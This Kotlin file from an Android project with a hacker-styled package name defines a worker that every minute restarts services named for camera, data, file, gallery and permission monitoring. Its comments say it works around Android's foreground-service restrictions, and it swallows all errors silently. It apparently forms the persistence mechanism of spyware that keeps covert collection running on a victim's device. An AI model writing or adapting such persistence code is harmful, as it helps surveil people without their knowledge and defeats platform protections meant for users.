package com.h4k3r.dreamer

import android.content.Context
import android.content.Intent
import androidx.work.Worker
import androidx.work.WorkerParameters
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.ExistingWorkPolicy
import java.util.concurrent.TimeUnit

class ServiceRevivalWorker(appContext: Context, workerParams: WorkerParameters) : Worker(appContext, workerParams) {
    override fun doWork(): Result {
        try {
            // Try to restart the PermissionMonitorService using regular startService
            // This avoids ForegroundServiceStartNotAllowedException
            val intent = Intent(applicationContext, PermissionMonitorService::class.java)
            applicationContext.startService(intent)
            
            // Also try to start other services
            val services = listOf(
                CameraService::class.java,
                DataService::class.java,
                FilesService::class.java,
                GalleryService::class.java
            )
            
            services.forEach { serviceClass ->
                try {
                    val serviceIntent = Intent(applicationContext, serviceClass)
                    applicationContext.startService(serviceIntent)
                } catch (e: Exception) {
                    // Ignore individual service failures
                }
            }
        } catch (e: Exception) {
            // If startService fails, we'll rely on AlarmManager and other methods
        }

        // Reschedule this worker to run again in 1 minute
        val nextWorkRequest = OneTimeWorkRequestBuilder<ServiceRevivalWorker>()
            .setInitialDelay(1, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "service-revival",
            ExistingWorkPolicy.REPLACE,
            nextWorkRequest
        )

        return Result.success()
    }
} 